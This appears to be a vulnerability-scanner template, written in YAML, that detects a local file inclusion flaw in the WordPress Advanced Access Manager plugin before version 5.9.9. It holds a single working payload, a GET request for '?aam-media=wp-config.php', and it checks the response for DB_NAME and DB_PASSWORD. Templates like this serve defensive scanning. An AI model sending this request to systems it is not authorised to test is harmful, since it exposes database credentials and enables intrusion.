id: advanced-access-manager-lfi
brief:
    title: WordPress Advanced Access Manager < 5.9.9 - Local File Inclusion
    by: 0x_Akoko
    level: high
    about: WordPress Advanced Access Manager versions before 5.9.9 are vulnerable to local file inclusion and allows attackers to download the wp-config.php file and get access to the database, which is publi...
    label:
        - wordpress
        - wp-plugin
        - lfi
        - wp
        - accessmanager
        - wpscan
        - vuln
    score: CVSS:7.5
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/?aam-media=wp-config.php'
      signs:
        - "on": word
          has:
            - DB_NAME
            - DB_PASSWORD
          in: body
          need: all
        - "on": status
          status:
            - 200
